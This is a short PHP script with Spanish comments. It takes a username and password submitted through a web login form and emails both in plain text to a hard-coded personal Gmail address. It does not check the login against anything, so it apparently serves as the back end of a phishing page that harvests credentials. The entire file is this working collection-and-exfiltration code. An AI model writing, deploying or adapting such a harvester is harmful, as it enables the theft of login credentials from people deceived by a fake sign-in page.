<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $contraseña = $_POST['contraseña'];

    // Configuración del correo electrónico
    $destinatario = 'garciasaraviaaxel@gmail.com';
    $asunto = 'Inicio de sesión';
    $mensaje = "Nombre de usuario: $usuario\nContraseña: $contraseña";

    // Envío del correo electrónico
    $resultado = mail($destinatario, $asunto, $mensaje);

    if ($resultado) {
        echo 'El correo electrónico se ha enviado correctamente.';
    } else {
        echo 'Hubo un error al enviar el correo electrónico.';
    }
}
?>
